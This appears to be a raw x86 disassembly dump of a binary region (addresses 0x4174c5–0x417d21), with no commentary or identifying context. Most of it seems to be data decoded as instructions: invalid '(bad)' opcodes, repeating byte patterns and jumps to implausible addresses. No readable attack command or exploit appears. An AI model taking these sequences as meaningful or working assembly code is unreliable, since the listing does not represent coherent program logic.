  4174c5:	add    BYTE PTR [eax],al
  4174c7:	add    ah,al
  4174c9:	pop    ebx
  4174ca:	xor    DWORD PTR [esi-0x5a],eax
  4174cd:	jnp    0x4174a2
  4174cf:	ja     0x4174a8
  4174d1:	mov    DWORD PTR [ecx],0x2d5eac5c
  4174d7:	arpl   WORD PTR [edx-0x1ed6e274],bp
  4174dd:	stos   DWORD PTR es:[edi],eax
  4174de:	push   edx
  4174df:	ins    DWORD PTR es:[edi],dx
  4174e0:	pushf  
  4174e1:	jg     0x417511
  4174e3:	pop    edi
  4174e4:	test   al,0x88
  4174e6:	inc    ebp
  4174e7:	inc    ecx
  4174e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174e9:	lea    ebx,[ebx]
  4174eb:	arpl   WORD PTR [edi-0x258fcf96],dx
  4174f1:	jp     0x417509
  4174f3:	data16 xchg BYTE PTR [esi],dl
  4174f6:	and    al,0x72
  4174f8:	pop    edi
  4174f9:	add    eax,0x35463de7
  4174fe:	pop    es
  4174ff:	and    BYTE PTR [ecx+0x12],bl
  417502:	pop    ebx
  417503:	sbb    eax,0x1d53244c
  417508:	addr16 das 
  41750a:	pop    es
  41750b:	xor    ebx,DWORD PTR [ecx+0x13]
  41750e:	xor    eax,0x2d054821
  417513:	push   eax
  417514:	sub    ah,ch
  417516:	inc    edx
  417517:	and    DWORD PTR [ebx],ebp
  417519:	sbb    DWORD PTR [eax],edx
  41751b:	push   ss
  41751c:	dec    ebp
  41751d:	sbb    DWORD PTR [eax],edx
  41751f:	pop    ss
  417520:	adc    al,0xe5
  417522:	sbb    esi,DWORD PTR [ebx]
  417524:	sbb    DWORD PTR [ebx],edx
  417526:	out    0x3d,eax
  417528:	cs xor eax,0x1fc7
	...
  41753e:	sbb    DWORD PTR [edx],edx
  417540:	repz sbb al,0x14
  417543:	and    al,0xfb
  417545:	sbb    al,0xf
  417547:	das    
  417548:	(bad)  
  417549:	xor    edx,ebp
  41754b:	adc    edx,ebx
  41754d:	fist   WORD PTR cs:[edx]
  417550:	ret    
  417551:	add    edi,DWORD PTR [eax+edi*1+0x27d9e3b7]
  417558:	fisubr DWORD PTR [edi]
  41755a:	(bad)  [esi]
  41755c:	enter  0xd52f,0x2d
  417560:	int    0xe3
  417562:	aad    0x2d
  417564:	mov    ecx,0x9346fa2f
  417569:	push   ebx
  41756a:	fisubr DWORD PTR [eax]
  41756c:	mov    WORD PTR [edx],?
  41756e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41756f:	sub    ecx,DWORD PTR [ebp-0x79d451dc]
  417575:	adc    eax,0x2f8821da
  41757a:	mov    ch,0x30
  41757c:	xchg   esi,eax
  41757d:	push   ds
  41757e:	cli    
  41757f:	inc    esi
  417580:	xchg   ebx,eax
  417581:	push   ebx
  417582:	ficom  DWORD PTR [eax+eax*1]
  417585:	jnp    0x41756b
  417587:	es addr16 jge 0x4175a5
  41758b:	push   ss
  41758c:	add    BYTE PTR [edi],ch
  41758e:	dec    edx
  41758f:	xor    eax,0x29055151
  417594:	ins    BYTE PTR es:[edi],dx
  417595:	jmp    0x5ab18699
  41759a:	mul    BYTE PTR [edi]
  41759c:	ins    BYTE PTR es:[edi],dx
  41759d:	push   ebp
  41759e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41759f:	and    dh,BYTE PTR [ecx+0x50]
	...
  4175b2:	add    BYTE PTR [eax],al
  4175b4:	(bad)  
  4175b5:	xor    eax,0x120a4f6d
  4175ba:	pop    edi
  4175bb:	cmp    edx,DWORD PTR ds:0x4b284b39
  4175c1:	lock push eax
  4175c3:	push   cs
  4175c4:	add    al,0x11
  4175c6:	pop    esp
  4175c7:	das    
  4175c8:	dec    edx
  4175c9:	xor    eax,0x29f7ff47
  4175ce:	pop    esp
  4175cf:	sbb    ch,ch
  4175d1:	adc    BYTE PTR [ebx-0x7],dh
  4175d4:	stc    
  4175d5:	inc    eax
  4175d6:	pop    edi
  4175d7:	std    
  4175d8:	fadd   DWORD PTR [eax+0x67]
  4175db:	sti    
  4175dc:	stc    
  4175dd:	cmp    BYTE PTR [esi-0x43],al
  4175e0:	leave  
  4175e1:	inc    ebx
  4175e2:	outs   dx,BYTE PTR ds:[esi]
  4175e3:	(bad)  
  4175e4:	push   cs
  4175e5:	add    eax,0x132bcc51
  4175ea:	arpl   bx,bx
  4175ec:	or     eax,0x27bd7124
  4175f1:	adc    al,0x6b
  4175f3:	int    0xf9
  4175f5:	dec    edx
  4175f6:	arpl   WORD PTR [ecx-0x3fb9e9f4],si
  4175fc:	or     eax,0xdd8f0028
  417601:	adc    al,0x71
  417603:	nop
  417604:	aad    0x27
  417606:	add    BYTE PTR cs:[edi],0x24
  41760a:	add    BYTE PTR [edi+0x7415d8],ah
  417610:	jo     0x4175fe
  417612:	push   0x6e
  417614:	jle    0x4175be
  417616:	aas    
  417617:	jb     0x417619
	...
  417629:	add    BYTE PTR [ecx+ebp*8+0x6e],dh
  41762d:	gs jno 0x417638
  417630:	inc    esi
  417631:	push   esp
  417632:	xor    ebx,ebp
  417634:	fs jae 0x417686
  417637:	mov    bl,0x61
  417639:	(bad)  
  41763b:	inc    ebx
  41763c:	dec    ecx
  41763d:	popa   
  41763e:	xor    edi,ebp
  417640:	pusha  
  417641:	push   ebx
  417642:	paddsb mm4,QWORD PTR [ebx+0x69]
  417646:	xor    al,0x4d
  417648:	aas    
  417649:	push   0x6568f201
  41764e:	adc    edi,ebp
  417650:	jo     0x4176c5
  417652:	mov    ds:0x93403dbc,eax
  417657:	les    eax,FWORD PTR [eax+eax*2-0x6d]
  41765b:	cli    
  41765c:	inc    ebp
  41765d:	inc    eax
  41765e:	mov    ds:0xa3404a40,eax
  417663:	enter  0x4049,0x93
  417667:	push   es
  417668:	push   eax
  417669:	inc    eax
  41766a:	xchg   ebx,eax
  41766b:	rcl    BYTE PTR [eax+eax*2+0x63],0xcb
  417670:	push   ecx
  417671:	inc    eax
  417672:	arpl   cx,ax
  417674:	push   esi
  417675:	inc    eax
  417676:	push   ebx
  417677:	inc    edx
  417678:	pop    eax
  417679:	inc    eax
  41767a:	push   ebx
  41767b:	andnps xmm0,XMMWORD PTR [eax+0x63]
  41767f:	inc    eax
  417680:	push   edi
  417681:	inc    eax
  417682:	arpl   WORD PTR [edi+0x59],sp
  417685:	inc    eax
  417686:	push   ebx
  417687:	aad    0x5f
  417689:	inc    eax
  41768a:	push   ebx
  41768b:	mov    esi,0x4060
	...
  4176a0:	and    ebp,DWORD PTR [ebx]
  4176a2:	pop    edi
  4176a3:	inc    eax
  4176a4:	and    esi,DWORD PTR [eax+0x5f]
  4176a7:	inc    eax
  4176a8:	adc    edi,esi
  4176aa:	arpl   WORD PTR [eax-0x6],ax
  4176ad:	lods   eax,DWORD PTR ds:[esi]
  4176ae:	xchg   esi,eax
  4176af:	fs mov edx,0xba66b1ad
  4176b5:	lods   eax,DWORD PTR ds:[esi]
  4176b6:	loop   0x41771c
  4176b8:	mov    edx,0xba6a90ad
  4176bd:	lods   eax,DWORD PTR ds:[esi]
  4176be:	sbb    BYTE PTR [ebx+0x3a],ch
  4176c1:	lods   al,BYTE PTR ds:[esi]
  4176c2:	mov    ebp,DWORD PTR [ebp+0x3a]
  4176c5:	lods   al,BYTE PTR ds:[esi]
  4176c6:	jae    0x417738
  4176c8:	cmp    ch,BYTE PTR [ebp+ecx*2+0x4eac3a6f]
  4176cf:	jb     0x41770b
  4176d1:	lods   al,BYTE PTR ds:[esi]
  4176d2:	sbb    dh,BYTE PTR [edx+edi*1-0x54]
  4176d6:	stc    
  4176d7:	ja     0x417713
  4176d9:	lods   al,BYTE PTR ds:[esi]
  4176da:	and    al,0x78
  4176dc:	cmp    ch,BYTE PTR [esp+ecx*8-0x253c588]
  4176e3:	js     0x41771f
  4176e5:	lods   al,BYTE PTR ds:[esi]
  4176e6:	sub    BYTE PTR [ecx+0x3a],bh
  4176e9:	lods   al,BYTE PTR ds:[esi]
  4176ea:	dec    esi
  4176eb:	xchg   BYTE PTR [edx],bh
  4176ed:	lods   al,BYTE PTR ds:[esi]
  4176ee:	cmp    al,BYTE PTR [edi-0x761553c6]
  4176f4:	cmp    ch,BYTE PTR [ebx+edi*4+0x24ac3a96]
  4176fb:	xchg   ebp,eax
  4176fc:	cmp    ch,BYTE PTR [edx+edi*8+0x7fabba97]
  417703:	cwde   
	...
  417714:	add    BYTE PTR [eax],al
  417716:	mov    edx,0xba96e8ab
  41771b:	stos   DWORD PTR es:[edi],eax
  41771c:	ins    DWORD PTR es:[edi],dx
  41771d:	xchg   edi,eax
  41771e:	mov    edx,0xba99d9ab
  417723:	stos   DWORD PTR es:[edi],eax
  417724:	mov    ebx,0x39abba9a
  417729:	cdq    
  41772a:	mov    edx,0xba9953ab
  41772f:	stos   DWORD PTR es:[edi],eax
  417730:	mov    al,0x99
  417732:	mov    edx,0xbaa3d8ab
  417737:	add    al,0xe7
  417739:	iret   
  41773a:	pop    ebp
  41773b:	inc    ebp
  41773c:	out    0xa0,eax
  41773e:	push   ebp
  41773f:	inc    ebp
  417740:	out    0x8b,eax
  417742:	push   ebx
  417743:	inc    ebp
  417744:	out    0x5c,eax
  417746:	push   ebx
  417747:	inc    ebp
  417748:	out    0xad,eax
  41774a:	inc    ebx
  41774b:	inc    ebp
  41774c:	out    0x18,eax
  41774e:	ds inc ebp
  417750:	out    0x69,eax
  417752:	mov    dh,0x44
  417754:	out    0xba,eax
  417756:	scas   al,BYTE PTR es:[edi]
  417757:	inc    esp
  417758:	out    0xb,eax
  41775a:	mov    eax,ds:0xa12ce744
  41775f:	inc    esp
  417760:	out    0x49,eax
  417762:	xchg   esp,eax
  417763:	inc    esp
  417764:	out    0xb3,eax
  417766:	mov    WORD PTR [edi+eiz*8+0x6d],es
  41776a:	mov    edx,0x7ce6e744
  41776f:	inc    esp
  417770:	out    0x28,eax
  417772:	jne    0x4177b8
  417774:	out    0xc0,eax
  417776:	ins    DWORD PTR es:[edi],dx
  417777:	inc    esp
  417778:	out    0x47,eax
	...
  41778a:	add    BYTE PTR [eax],al
  41778c:	mov    ebx,0xbb65e744
  417791:	inc    esp
  417792:	out    0xf6,eax
  417794:	mov    ecx,0xb8f1e744
  417799:	inc    esp
  41779a:	out    0x6b,eax
  41779c:	mov    ecx,0xb538e744
  4177a1:	inc    esp
  4177a2:	out    0x6d,eax
  4177a4:	cmp    eax,0x40f7e744
  4177a9:	inc    esp
  4177aa:	out    0x1b,eax
  4177ac:	xor    DWORD PTR [edi+eiz*8+0x33],eax
  4177b0:	sub    eax,0x2b3ee744
  4177b5:	inc    esp
  4177b6:	out    0x7b,eax
  4177b8:	sub    DWORD PTR [edi+eiz*8-0x5c],eax
  4177bc:	sub    DWORD PTR [edi+eiz*8+0x38],eax
  4177c0:	and    al,BYTE PTR [eax+eax*1-0x17]
  4177c4:	jnp    0x417782
  4177c6:	inc    eax
  4177c7:	jmp    0xe98229f9
  4177cc:	je     0x41777f
  4177ce:	inc    eax
  4177cf:	jmp    0xe98236c2
  4177d4:	cmp    BYTE PTR [esi+0x4f9e940],0x0
  4177db:	jmp    0xe9417cd9
  4177e0:	stc    
  4177e1:	add    al,0x0
  4177e3:	jmp    0xe9417ce1
  4177e8:	stc    
  4177e9:	add    al,0x0
  4177eb:	jmp    0x44a8a12e
	...
  417800:	add    BYTE PTR [eax],al
  417802:	sub    BYTE PTR [ecx],dl
  417804:	and    BYTE PTR [ecx],ah
  417806:	sbb    DWORD PTR [esi],edx
  417808:	push   0x3f3106e9
  41780d:	sbb    eax,0x302b360d
  417812:	sub    eax,0xf21b4d35
  417817:	jmp    0x417865
  417819:	and    dh,dh
  41781b:	jecxz  0x417880
  41781d:	xlat   BYTE PTR ds:[ebx]
  41781e:	fcomp  QWORD PTR [ebx+eiz*2]
  417821:	jmp    0x317360ba
  417826:	(bad)  
  417827:	adc    BYTE PTR [edx+0x14],dh
  41782a:	aad    0x4
  41782c:	ins    DWORD PTR es:[edi],dx
  41782d:	adc    dl,dl
  41782f:	out    0x61,al
  417831:	or     dl,ah
  417833:	add    al,0x7
  417835:	loopne 0x41783b
  417837:	or     ecx,DWORD PTR [ebx]
  417839:	jecxz  0x41783b
  41783b:	in     eax,0x39
  41783d:	(bad)  
  41783e:	or     al,0x28
  417840:	and    ah,ch
  417842:	out    dx,eax
  417843:	in     al,0x63
  417845:	int3   
  417846:	and    eax,0x290406e5
  41784b:	clc    
  41784c:	pop    ds
  41784d:	add    BYTE PTR [esi+0xa],cl
  417850:	add    eax,0x6a43569
  417855:	and    BYTE PTR [esi-0x4],al
  417858:	fs jae 0x4178c2
  41785b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41785c:	push   es
  41785d:	and    BYTE PTR [ebx],dh
  41785f:	lahf   
  417860:	and    BYTE PTR cs:[edx],ch
  417863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417864:	sbb    eax,0x67
	...
  417875:	add    BYTE PTR [eax],al
  417877:	add    BYTE PTR [eax+esi*8+0x6a],bh
  41787b:	and    BYTE PTR [edx],bl
  41787d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41787e:	ins    BYTE PTR es:[edi],dx
  41787f:	jne    0x417803
  417881:	or     cl,BYTE PTR [ecx]
  417883:	or     dh,BYTE PTR [ebx]
  417885:	loopne 0x4178e7
  417887:	ins    BYTE PTR es:[edi],dx
  417888:	ret    
  417889:	or     ah,BYTE PTR [eax]
  41788b:	and    eax,0x1ffda3b3
  417890:	repz sahf 
  417892:	and    dh,BYTE PTR [ebx-0xf]
  417895:	mov    al,ds:0xa103201d
  41789a:	std    
  41789b:	push   edx
  41789c:	cmp    esp,eax
  41789e:	imul   ebp,DWORD PTR [esi+edx*1-0x7],0x60
  4178a3:	arpl   WORD PTR [esi],ax
  4178a5:	std    
  4178a6:	pusha  
  4178a7:	inc    ecx
  4178a8:	mov    ds:0xef6567f0,eax
  4178ad:	aam    0x2e
  4178af:	xor    cl,ch
  4178b1:	fild   QWORD PTR [ebx+0x6c]
  4178b4:	xchg   ebx,eax
  4178b5:	fidiv  WORD PTR [edi+0x70]
  4178b8:	call   ebp
  4178ba:	jno    0x417921
  4178bc:	icebp  
  4178bd:	xchg   edx,eax
  4178be:	bound  edi,QWORD PTR [eax-0xa]
  4178c1:	add    BYTE PTR [edi+0x2d],cl
  4178c4:	inc    edx
  4178c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178c6:	xor    ch,BYTE PTR ds:0xfffdbbb2
  4178cc:	arpl   WORD PTR [ebx],ax
  4178ce:	add    BYTE PTR [ebx+0x36],dl
  4178d1:	dec    edx
  4178d2:	imul   esi,DWORD PTR [eax+0x36],0xfa6f6ef1
  4178d9:	mov    edi,0x7422
	...
  4178ee:	xlat   BYTE PTR ds:[ebx]
  4178ef:	pop    ebp
  4178f0:	adc    esp,DWORD PTR [edi-0x34]
  4178f3:	mov    ah,0x2d
  4178f5:	arpl   bp,dx
  4178f7:	rol    BYTE PTR [ecx],0x51
  4178fa:	lahf   
  4178fb:	jns    0x417921
  4178fd:	(bad)  
  4178fe:	retf   0x2a5b
  417901:	jbe    0x417896
  417903:	jno    0x41792b
  417905:	gs xchg edi,eax
  417907:	lods   eax,DWORD PTR ds:[esi]
  417908:	xor    al,0x63
  41790a:	mov    ecx,0x956e2285
  41790f:	or     BYTE PTR [edi+0x6d],0x8e
  417913:	je     0x41793c
  417915:	ja     0x4178c1
  417917:	sbb    ebp,DWORD PTR [edx]
  417919:	jbe    0x41797e
  41791b:	and    BYTE PTR [esi],0x65
  41791e:	push   edi
  41791f:	lods   al,BYTE PTR ds:[esi]
  417920:	xor    al,0x63
  417922:	cmp    DWORD PTR [edx],edi
  417924:	daa    
  417925:	pop    edi
  417926:	inc    cx
  417928:	cmp    BYTE PTR [ebp+0x61],ch
  41792b:	dec    ecx
  41792c:	cs push eax
  41792e:	dec    eax
  41792f:	inc    ebp
  417930:	push   ss
  417931:	addr16 push esi
  417933:	dec    ecx
  417934:	and    eax,0x26fafa63
  417939:	inc    edx
  41793a:	sbb    ecx,DWORD PTR [ebx+0x29]
  41793d:	jae    0x417969
  41793f:	cld    
  417940:	adc    DWORD PTR [edi+0x2c],esp
  417943:	cmc    
  417944:	das    
  417945:	arpl   WORD PTR ds:0x1f510401,dx
  41794b:	fisub  DWORD PTR [esi]
  41794d:	jno    0x417955
  41794f:	xchg   edi,eax
  417950:	packsswb mm0,QWORD PTR [eax]
	...
  417963:	add    BYTE PTR [edx],ch
  417965:	call   0x6527:0x813762c
  41796c:	fild   QWORD PTR [ebx-0x6a3c9cce]
  417972:	and    dh,BYTE PTR [edx-0x21]
  417975:	add    al,0xc8
  417977:	adc    bl,cl
  417979:	xor    edx,esp
  41797b:	cs into 
  41797d:	and    esi,DWORD PTR [edi-0x3ff12aef]
  417983:	das    
  417984:	fstp   DWORD PTR ds:0x1fab03cc
  41798a:	test   al,0x12
  41798c:	stos   DWORD PTR es:[edi],eax
  41798d:	sub    ecx,esi
  41798f:	sub    eax,0x30c012ca
  417994:	lds    edx,FWORD PTR [edx]
  417996:	mov    al,ds:0x84298f37
  41799b:	sub    eax,0x158012aa
  4179a0:	xchg   ebp,eax
  4179a1:	sub    BYTE PTR [esi+eiz*1+0x3e70499],al
  4179a8:	cli    
  4179a9:	add    al,0xe7
  4179ab:	add    edi,edx
  4179ad:	add    al,0xe7
  4179af:	add    edi,edx
  4179b1:	add    al,0xe7
  4179b3:	add    edi,edx
  4179b5:	add    al,0xe7
  4179b7:	add    edi,edx
  4179b9:	add    al,0xe7
  4179bb:	add    edi,edx
  4179bd:	add    al,0xe7
  4179bf:	add    edi,edx
  4179c1:	add    al,0xe7
  4179c3:	add    edi,edx
  4179c5:	add    al,0xe7
  4179c7:	add    eax,DWORD PTR [eax]
	...
  4179d9:	add    dl,bh
  4179db:	add    al,0xe7
  4179dd:	add    edi,edx
  4179df:	add    al,0xe7
  4179e1:	add    edi,edx
  4179e3:	add    al,0xe7
  4179e5:	add    edi,edx
  4179e7:	add    al,0xe7
  4179e9:	add    edi,edx
  4179eb:	add    al,0xe7
  4179ed:	add    edi,edx
  4179ef:	add    al,0xe7
  4179f1:	add    edi,edx
  4179f3:	add    al,0xe7
  4179f5:	add    edi,edx
  4179f7:	add    al,0xe7
  4179f9:	add    edi,edx
  4179fb:	add    al,0xe7
  4179fd:	add    edi,edx
  4179ff:	add    al,0x0
  417a01:	jmp    0xe9417eff
  417a06:	stc    
  417a07:	add    al,0x0
  417a09:	jmp    0xe9417f07
  417a0e:	stc    
  417a0f:	add    al,0x0
  417a11:	jmp    0xe9417f0f
  417a16:	stc    
  417a17:	add    al,0x0
  417a19:	jmp    0xe9417f17
  417a1e:	stc    
  417a1f:	add    al,0x0
  417a21:	jmp    0xe9417f1f
  417a26:	stc    
  417a27:	add    al,0x0
  417a29:	jmp    0xe9417f27
  417a2e:	stc    
  417a2f:	add    al,0x0
  417a31:	jmp    0xe9417f2f
  417a36:	stc    
  417a37:	add    al,0x0
  417a39:	jmp    0xe9417f37
	...
  417a4e:	add    BYTE PTR [eax],al
  417a50:	stc    
  417a51:	add    al,0x0
  417a53:	jmp    0xe9417f51
  417a58:	stc    
  417a59:	add    al,0x0
  417a5b:	jmp    0xe9417f59
  417a60:	stc    
  417a61:	add    al,0x0
  417a63:	jmp    0xe9417f61
  417a68:	stc    
  417a69:	add    al,0x0
  417a6b:	jmp    0xe9417f69
  417a70:	stc    
  417a71:	add    al,0x0
  417a73:	jmp    0xe9417f71
  417a78:	stc    
  417a79:	add    al,0x0
  417a7b:	jmp    0xe9417f79
  417a80:	stc    
  417a81:	add    al,0x0
  417a83:	jmp    0xe9417f81
  417a88:	stc    
  417a89:	add    al,0x0
  417a8b:	add    BYTE PTR [ebx+0x63000008],dl
  417a91:	or     BYTE PTR [eax],al
  417a93:	add    BYTE PTR [ebx+0x8],ah
  417a96:	add    BYTE PTR [eax],al
  417a98:	push   ebx
  417a99:	or     BYTE PTR [eax],al
  417a9b:	add    BYTE PTR [ebx+0x8],dl
  417a9e:	add    BYTE PTR [eax],al
  417aa0:	arpl   WORD PTR [eax],cx
  417aa2:	add    BYTE PTR [eax],al
  417aa4:	arpl   WORD PTR [eax],cx
  417aa6:	add    BYTE PTR [eax],al
  417aa8:	push   ebx
  417aa9:	or     BYTE PTR [eax],al
  417aab:	add    BYTE PTR [ebx+0x8],dl
  417aae:	add    BYTE PTR [eax],al
  417ab0:	and    ecx,DWORD PTR [eax]
	...
  417ac6:	and    ecx,DWORD PTR [eax]
  417ac8:	add    BYTE PTR [eax],al
  417aca:	adc    ecx,DWORD PTR [eax]
  417acc:	add    BYTE PTR [eax],al
  417ace:	adc    ecx,DWORD PTR [eax]
  417ad0:	add    BYTE PTR [eax],al
  417ad2:	and    ecx,DWORD PTR [eax]
  417ad4:	add    BYTE PTR [eax],al
  417ad6:	and    ecx,DWORD PTR [eax]
  417ad8:	add    BYTE PTR [eax],al
  417ada:	adc    ecx,DWORD PTR [eax]
  417adc:	add    BYTE PTR [eax],al
  417ade:	adc    ecx,DWORD PTR [eax]
  417ae0:	add    BYTE PTR [eax],al
  417ae2:	jecxz  0x417aeb
  417ae4:	add    BYTE PTR [eax],al
  417ae6:	jecxz  0x417aef
  417ae8:	add    BYTE PTR [eax],al
  417aea:	rol    DWORD PTR [edi],cl
  417aec:	add    BYTE PTR [eax],al
  417aee:	rol    DWORD PTR [edi],cl
  417af0:	add    BYTE PTR [eax],al
  417af2:	jecxz  0x417afb
  417af4:	add    BYTE PTR [eax],al
  417af6:	jecxz  0x417aff
  417af8:	add    BYTE PTR [eax],al
  417afa:	rol    DWORD PTR [edi],cl
  417afc:	add    BYTE PTR [eax],al
  417afe:	rol    DWORD PTR [edi],cl
  417b00:	add    BYTE PTR [eax],al
  417b02:	mov    ds:0xa3000007,eax
  417b07:	pop    es
  417b08:	add    BYTE PTR [eax],al
  417b0a:	xchg   ebx,eax
  417b0b:	pop    es
  417b0c:	add    BYTE PTR [eax],al
  417b0e:	xchg   ebx,eax
  417b0f:	pop    es
  417b10:	add    BYTE PTR [eax],al
  417b12:	mov    ds:0xfa000007,eax
  417b17:	popf   
  417b18:	add    DWORD PTR [eax],eax
  417b1a:	cli    
  417b1b:	popf   
  417b1c:	add    DWORD PTR [eax],eax
  417b1e:	cli    
  417b1f:	popf   
  417b20:	add    DWORD PTR [eax],eax
  417b22:	cli    
  417b23:	popf   
  417b24:	add    DWORD PTR [eax],eax
  417b26:	cli    
  417b27:	popf   
  417b28:	add    DWORD PTR [eax],eax
	...
  417b3a:	add    BYTE PTR [eax],al
  417b3c:	cli    
  417b3d:	popf   
  417b3e:	add    DWORD PTR [eax],eax
  417b40:	cli    
  417b41:	popf   
  417b42:	add    DWORD PTR [eax],eax
  417b44:	cli    
  417b45:	popf   
  417b46:	add    DWORD PTR [eax],eax
  417b48:	cli    
  417b49:	popf   
  417b4a:	add    DWORD PTR [eax],eax
  417b4c:	cli    
  417b4d:	popf   
  417b4e:	add    DWORD PTR [eax],eax
  417b50:	cli    
  417b51:	popf   
  417b52:	add    DWORD PTR [eax],eax
  417b54:	cli    
  417b55:	popf   
  417b56:	add    DWORD PTR [eax],eax
  417b58:	cli    
  417b59:	popf   
  417b5a:	add    DWORD PTR [eax],eax
  417b5c:	cli    
  417b5d:	popf   
  417b5e:	add    DWORD PTR [eax],eax
  417b60:	cli    
  417b61:	popf   
  417b62:	add    DWORD PTR [eax],eax
  417b64:	cli    
  417b65:	popf   
  417b66:	add    DWORD PTR [eax],eax
  417b68:	cli    
  417b69:	popf   
  417b6a:	add    DWORD PTR [eax],eax
  417b6c:	cli    
  417b6d:	popf   
  417b6e:	add    DWORD PTR [eax],eax
  417b70:	cli    
  417b71:	popf   
  417b72:	add    DWORD PTR [eax],eax
  417b74:	cli    
  417b75:	pushf  
  417b76:	loopne 0x417bba
  417b78:	push   ebp
  417b79:	and    eax,0xa2d5cb68
  417b7e:	mov    esi,0x303282ba
  417b83:	xor    ch,dl
  417b85:	adc    al,0x6d
  417b87:	retf   
  417b88:	fstp   QWORD PTR [ebp+0x1c5d42e6]
  417b8e:	add    al,0x40
  417b90:	cli    
  417b91:	sti    
  417b92:	add    edx,DWORD PTR [eax]
  417b94:	cli    
  417b95:	xchg   ebx,eax
  417b96:	add    DWORD PTR [edx+edi*8],eax
  417b99:	popf   
  417b9a:	add    edi,edi
  417b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9d:	pushf  
  417b9e:	add    DWORD PTR [eax+0x0],eax
	...
  417bb0:	add    BYTE PTR [eax],al
  417bb2:	cli    
  417bb3:	add    al,0xe7
  417bb5:	add    edi,DWORD PTR [edx]
  417bb7:	add    eax,0x4da03e7
  417bbc:	out    0x3,eax
  417bbe:	jmp    0xe704:0xf203e704
  417bc5:	add    edi,esi
  417bc7:	add    al,0xe7
  417bc9:	add    edi,eax
  417bcb:	add    al,0xe7
  417bcd:	add    esp,DWORD PTR [ebp-0x6e]
  417bd0:	out    0x83,eax
  417bd2:	cli    
  417bd3:	add    al,0xe7
  417bd5:	inc    ebx
  417bd6:	cli    
  417bd7:	add    al,0xe7
  417bd9:	jecxz  0x417c28
  417bdb:	xchg   edx,eax
  417bdc:	out    0xf3,eax
  417bde:	inc    ebp
  417bdf:	xchg   edx,eax
  417be0:	out    0xb,eax
  417be2:	cli    
  417be3:	add    al,0xe7
  417be5:	push   DWORD PTR ds:0xfa05e792
  417beb:	add    al,0xe7
  417bed:	add    al,0xfa
  417bef:	add    al,0x67
  417bf1:	add    al,0xfa
  417bf3:	add    al,0xa7
  417bf5:	add    edi,edx
  417bf7:	add    al,0xc7
  417bf9:	add    edi,edx
  417bfb:	add    al,0xf7
  417bfd:	add    edi,edx
  417bff:	add    al,0xdf
  417c01:	add    edi,edx
  417c03:	add    al,0xeb
  417c05:	add    edi,edx
  417c07:	add    al,0xe9
  417c09:	add    edi,edx
  417c0b:	add    al,0xe8
  417c0d:	add    edi,edx
  417c0f:	add    al,0xaf
  417c11:	rcl    DWORD PTR ds:0xf3fee5,cl
	...
  417c27:	add    ch,bh
  417c29:	add    al,0x20
  417c2b:	aad    0x14
  417c2d:	in     al,0xef
  417c2f:	hlt    
  417c30:	cld    
  417c31:	add    edx,DWORD PTR [ecx]
  417c33:	(bad)  
  417c34:	adc    esp,edi
  417c36:	loopne 0x417c2d
  417c38:	add    eax,DWORD PTR [edi]
  417c3a:	add    dl,bh
  417c3c:	loop   0x417c23
  417c3e:	push   esi
  417c40:	retf   
  417c41:	fbld   TBYTE PTR ds:0x5ffabcf
  417c47:	in     al,0xaa
  417c49:	fisub  WORD PTR [edx]
  417c4b:	cld    
  417c4c:	mov    bh,dh
  417c4e:	add    dl,ch
  417c50:	mov    ch,0xdd
  417c52:	and    ebp,ebp
  417c54:	(bad)  
  417c55:	std    
  417c56:	add    esp,edx
  417c58:	ins    BYTE PTR es:[edi],dx
  417c59:	cld    
  417c5a:	add    al,ch
  417c5c:	test   DWORD PTR [eax],0xf7e106
  417c62:	push   cs
  417c63:	fisub  WORD PTR [esi-0xc]
  417c66:	adc    bh,dh
  417c68:	push   esi
  417c69:	in     al,dx
  417c6a:	sbb    ebp,esp
  417c6c:	dec    ecx
  417c6d:	sti    
  417c6e:	adc    al,0xe9
  417c70:	inc    ebp
  417c71:	add    ebx,DWORD PTR [ecx]
  417c73:	(bad)  
  417c75:	clc    
  417c76:	push   es
  417c77:	fild   QWORD PTR [edi]
  417c79:	cld    
  417c7a:	add    al,ah
  417c7c:	clc    
  417c7d:	inc    DWORD PTR ds:0xfefd2cd3
  417c83:	add    BYTE PTR [ebp-0x11],al
  417c86:	and    edx,edi
  417c88:	sub    ebp,esi
  417c8a:	and    al,0xdb
	...
  417c9c:	add    BYTE PTR [eax],al
  417c9e:	adc    eax,0x29c22cf1
  417ca3:	out    0x34,eax
  417ca5:	enter  0xde2d,0x26
  417ca9:	mov    eax,0xe91cecdc
  417cae:	in     eax,dx
  417caf:	pop    DWORD PTR [eax]
  417cb1:	jmp    0xe94181af
  417cb6:	stc    
  417cb7:	(bad)  
  417cb8:	std    
  417cb9:	in     eax,dx
  417cba:	aad    0x8f
  417cbc:	add    ch,ah
  417cbe:	stc    
  417cbf:	pop    DWORD PTR [eax]
  417cc1:	in     eax,dx
  417cc2:	lds    ecx,FWORD PTR [edi+0x4f9e5fd]
  417cc8:	add    BYTE PTR [eax],al
  417cca:	mov    ds:0xa3fffd04,eax
  417ccf:	nop
  417cd0:	std    
  417cd1:	call   DWORD PTR [ebx-0x68ff0170]
  417cd7:	nop
  417cd8:	inc    BYTE PTR [eax]
  417cda:	mov    ds:0x97fffd90,eax
  417cdf:	nop
  417ce0:	std    
  417ce1:	add    BYTE PTR [edi-0x6cff02fc],dl
  417ce7:	add    al,0x0
  417ce9:	add    DWORD PTR [edi+0x4],esp
  417cec:	add    BYTE PTR [eax],al
  417cee:	push   edi
  417cef:	nop
  417cf0:	std    
  417cf1:	call   DWORD PTR [ebx-0x70]
  417cf4:	std    
  417cf5:	add    BYTE PTR [ebx-0x70],dl
  417cf8:	std    
  417cf9:	add    BYTE PTR [ebx-0x70],ah
  417cfc:	(bad)  
  417cfd:	jmp    DWORD PTR [ebx-0x70]
  417d00:	(bad)  
  417d01:	inc    DWORD PTR [eax]
	...
  417d13:	add    BYTE PTR [ebx+0x4],dl
  417d16:	std    
  417d17:	add    BYTE PTR [ebx+0x4],dl
  417d1a:	std    
  417d1b:	add    BYTE PTR [edi],ah
  417d1d:	nop
  417d1e:	std    
  417d1f:	add    BYTE PTR [edi],dl
  417d21:	add    al,0xfd
